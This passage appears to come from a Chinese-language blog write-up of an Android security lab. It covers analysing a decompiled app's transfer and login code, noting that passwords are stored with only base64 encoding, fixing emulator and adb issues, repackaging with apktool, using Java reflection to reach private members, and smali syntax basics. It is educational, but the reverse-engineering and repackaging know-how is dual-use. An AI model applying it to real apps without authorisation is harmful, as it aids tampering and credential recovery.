<p>最终会调用 restClient.dotransfer，此时传入的参数会比之前正常登陆多出三个：fromAccount、toAccount、amount，应该是实现的一个转账功能。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230318151528525.png"><span class="image-caption">image-20230318151528525</span></p>
<p>然后进行跟之前类似的处理：访问的页面变成了 /transfer，然后也是进入的 postHttpContent 进行 post 传参。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230318151654663.png"><span class="image-caption">image-20230318151654663</span></p>
<p>看看其他的功能，先看 fill_data，非常简单，会从 mySharedPreferences 中读取账号密码输入到账号和密码的输入框中，不存在则默认为 Null。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317212104246.png"><span class="image-caption">image-20230317212104246</span></p>
<p>然后是 Remember Me 的勾选框，跟 fill_data 的功能是相对应，是一个把账号密码保存在 mySharedPreferences 的操作。但是会多一个将密码加一层 base64 的操作。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317212325932.png"><span class="image-caption">image-20230317212325932</span></p>
<p>其他的部分就没涉及到 password 的操作了。</p>
<h3 id="问题及解决"><a href="#问题及解决" class="headerlink" title="问题及解决"></a>问题及解决</h3><h4 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h4><p>显示已经安装 HAXM，但是创建安卓虚拟机时却显示未安装。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230309151055599.png"><span class="image-caption">image-20230309151055599</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230309150838150.png"><span class="image-caption">image-20230309150838150</span></p>
<p>解决：</p>
<p>找到 Your SDK path\extras\intel\Hardware_Accelerated_Execution_Manager 目录下的 haxm-7.6.5-setup.exe，双击安装他即可。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230309153804785.png"><span class="image-caption">image-20230309153804785</span></p>
<p>成功解决问题。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230309153901156.png"><span class="image-caption">image-20230309153901156</span></p>
<h4 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h4><p>不存在 -p 的参数。。也许是版本问题。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230309230350062.png"><span class="image-caption">image-20230309230350062</span></p>
<p>删去即可。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">adb shell am broadcast -<span class="hljs-selector-tag">a</span> android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.action</span>.BOOT_COMPLETED<br></code></pre></td></tr></table></figure>

<h4 id="问题三"><a href="#问题三" class="headerlink" title="问题三"></a>问题三</h4><p>安装好 Android Studio 一定要先随便创个项目，然后运行一下，看是否能够运行 apk！！！！！！我踩了这个巨坑，因为第一个 task 做就是后台，我一直以为是代码问题，结果去随便创个项目，发现 apk 无法运行在 ADV 上。</p>
<p>解决：直接删了重下。</p>
<h4 id="问题四"><a href="#问题四" class="headerlink" title="问题四"></a>问题四</h4><p>我的 Android Studio 必须点击用管理员运行才行，不然会一直问题报错 adb 无法正常运行。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230310194655038.png"><span class="image-caption">image-20230310194655038</span></p>
<h4 id="问题五"><a href="#问题五" class="headerlink" title="问题五"></a>问题五</h4><p>运行时报了一个错，显示是索引超出了范围。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313155656757.png"><span class="image-caption">image-20230313155656757</span></p>
<p>去搜了一下，byte 在 java 里的范围是 -128<del>127，不是无符号的，但是这边需要的是无符号的数字，所以能表示 0</del>255 即可。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313161522660.png"><span class="image-caption">image-20230313161522660</span></p>
<h4 id="问题六"><a href="#问题六" class="headerlink" title="问题六"></a>问题六</h4><p>重打包时，遇到报错如下，根据是因为 res 资源文件的问题，所以在解包时就加上 -r 参数，选择不解包资源文件即可。 </p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230315224040421.png"><span class="image-caption">image-20230315224040421</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230316194743569.png"><span class="image-caption">image-20230316194743569</span></p>
<h3 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h3><ul>
<li>adb 命令简单使用：<ul>
<li><code>adb start-server</code>开启 adb 服务。</li>
<li><code>adb kill-server</code>关闭 adb 服务。</li>
<li><code>adb -P &lt;port&gt; start-server</code> 指定 adb server 的网络端口port（默认为5037）启动服务。</li>
<li><code>adb devices</code> 查看adb 连接设备。</li>
<li><code>adb shell am broadcast [options] &lt;INTENT&gt;</code> <ul>
<li>-a <ACTION> 指定 action，如 android.intent.action.VIEW</ACTION></li>
<li>-c <CATEGORY> 指定 category，如 android.intent.category.APP_CONTACTS</CATEGORY></li>
<li>-n <COMPONENT> 指定完整 component 名，用于明确指定启动哪个 Activity，如<br>com.example.app/.ExampleActivity</COMPONENT></li>
</ul>
</li>
</ul>
</li>
<li>匿名重写：一种简洁代码的写法，直接进行重写方法，然后把返回的对象作为参数进行传递。</li>
<li>java 反射：指在运行时（runtime）动态地获取一个类的信息并操作它的属性、方法和构造函数等。因此我们也可以借此来访问到 private 的属性和方法。<ul>
<li><code>java.lang.reflect.Field</code> 用于获取类的属性。</li>
<li><code>java.lang.reflect.Method</code> 用于获取类的方法。</li>
<li>访问 private 的属性与方法的流程如下：<ol>
<li><code>Class&lt;?&gt; x = Class.forName(&quot;class_name&quot;);</code>  class_name 是要获取的类的名字（写全名）。</li>
<li><code>Field filed = x.getDeclaredField(&quot;class_filed&quot;);</code> or <code>Method method = x.getDeclaredMethod(&quot;class_method&quot;);</code> 实例化想获取的属性或方法。</li>
<li><code>filed.setAccessible(true);</code> or <code>method.setAccessible(true);</code> 设置允许访问。</li>
<li><code>class_name y = new class_name();</code> 实例化一个 class_name 的对象 y。</li>
<li><code>field.get(y);</code> or <code>method.invoke(y);</code> 最终获取属性或调用方法</li>
<li>对于方法，如果存在参数，则要在 2 步骤中进行说明， 以及在 5 步骤的调用中传入。</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="smali"><a href="#smali" class="headerlink" title="smali"></a>smali</h3><p>smali ：一种介于 apk 和 java 源码之间的一种表示方式。使用 apktool 反编译 apk 后，会在反编译工程目录下生成一个 smali文件夹，一般而言，一个 smali 文件对应着一个类。</p>
<p>在 smali 代码中，声明语句一般都是以 <code>.</code> 开始。</p>
<h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.class</span> &lt;访问权限&gt; [非权限修饰符] &lt;类名&gt;<br><span class="hljs-keyword">.super</span> &lt;父类名&gt;<br><span class="hljs-keyword">.source</span> &lt;源文件名&gt;<br><span class="hljs-keyword">.implements</span> &lt;接口名称&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>&lt;&gt;中的内容表示必不可缺的，[]表示的是可选择的。</li>
<li>访问权限修饰符即<code>public, protected, private, default</code>。</li>
<li>而非权限修饰符则指的是<code>final, abstract</code>。</li>
<li><code>L</code>表示类的完整签名，如<code>.super Ljava/lang/Object;</code> 表明是继承于 java/lang/Object 类。</li>
<li>经过混淆后，.source 可能为空。</li>
</ul>
<h4 id="类型对应"><a href="#类型对应" class="headerlink" title="类型对应"></a>类型对应</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">B—byte<br>C—char<br>D—double<br>F—float<br>I—int<br>J—long<br>S—short<br>V—void<br>Z—boolean<br>[—array<br>L-对象类型<br>注：如果是int数组表示形式为[I。<br>再比如数组类型String[][]，在smali中表示形式为[[<span class="hljs-class">Ljava/lang/String;</span>。<br></code></pre></td></tr></table></figure>

<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>一个方法所申请的寄存器会分配给函数方法的参数 (parameter) 以及局部变量 (local variable) 。在 smali 中，一般有两种命名规则</p>
<ul>
<li>v 命名法</li>
<li>p 命名法</li>
</ul>
<p>假设方法申请了 m+n 个寄存器，其中局部变量占 m 个寄存器，参数占 n 个寄存器，对于不同的命名规则，其相应的命名如下：</p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">v命名法</th>
<th align="center">p命名法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">局部变量</td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.471ex" height="2.009ex" style="vertical-align: -0.671ex;" viewbox="0 -576.1 6660.9 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v_0,v_1,...,v_{m-1}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-30" x="686" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="939" y="0"/>
<g transform="translate(1384,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="686" y="-213"/>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="2323" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="2769" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3214" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3659" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="4104" y="0"/>
<g transform="translate(4549,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
<g transform="translate(485,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2212" x="878" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1657" y="0"/>
</g>
</g>
</g>
</svg></td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.471ex" height="2.009ex" style="vertical-align: -0.671ex;" viewbox="0 -576.1 6660.9 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v_0,v_1,...,v_{m-1}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-30" x="686" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="939" y="0"/>
<g transform="translate(1384,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="686" y="-213"/>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="2323" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="2769" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3214" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3659" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="4104" y="0"/>
<g transform="translate(4549,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
<g transform="translate(485,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2212" x="878" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1657" y="0"/>
</g>
</g>
</g>
</svg></td>
</tr>
<tr>
<td align="center">函数参数</td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="18.977ex" height="2.009ex" style="vertical-align: -0.671ex;" viewbox="0 -576.1 8170.6 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v_m,v_{m+1},...,v_{m+n}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="686" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="1206" y="0"/>
<g transform="translate(1651,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
<g transform="translate(485,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2B" x="878" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1657" y="0"/>
</g>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="3762" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="4208" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="4653" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="5098" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="5543" y="0"/>
<g transform="translate(5988,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
<g transform="translate(485,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2B" x="878" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6E" x="1657" y="0"/>
</g>
</g>
</g>
</svg></td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.229ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 6556.8 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">p_0,p_1,...,p_{n-1}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-30" x="712" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="957" y="0"/>
<g transform="translate(1402,0)">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="712" y="-213"/>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="2359" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="2805" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3250" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3695" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="4140" y="0"/>
<g transform="translate(4585,0)">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
<g transform="translate(503,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2212" x="600" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1379" y="0"/>
</g>
</g>
</g>
</svg></td>
</tr>
</tbody></table>
<p> 一般来说都是 p 命名法，因为其具有较好的可读性，可以方便地让我们知道寄存器属于哪一种类型。</p>
<p>需要注意的是，在非 static 方法中，p0 表示<code>this</code>，p1 才表示第一个参数。</p>
<h4 id="类变量声明"><a href="#类变量声明" class="headerlink" title="类变量声明"></a>类变量声明</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.field</span> &lt;访问权限&gt; &lt;变量名&gt;:&lt;变量类型&gt;<br>例如：.field<span class="hljs-keyword"> private</span> str1:<span class="hljs-class">Ljava/lang/String;</span><br>等于 <span class="hljs-keyword"> private</span> java.lang.String str1;<br><br>局部变量声明：<br><span class="hljs-keyword">.local</span> &lt;初始值&gt;, &lt;变量名&gt;:&lt;变量类型&gt;<br></code></pre></td></tr></table></figure>

<h4 id="类方法声明"><a href="#类方法声明" class="headerlink" title="类方法声明"></a>类方法声明</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.method</span> &lt;访问权限&gt; &lt;方法名&gt;(参数类型)&lt;返回值类型&gt;<br>	[.registers]   // 寄存器个数=field个数+local个数<br>    [.prologue]    // 指定代码开始位置<br>    [.param]       // 指定方法参数<br>    [.line]        // 指定代码在源代码中的行数，混淆后可能不存在<br>    [.locals]      // 使用的局部变量个数<br>    &lt;代码体&gt;<span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br></code></pre></td></tr></table></figure>

<h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><table>
<thead>
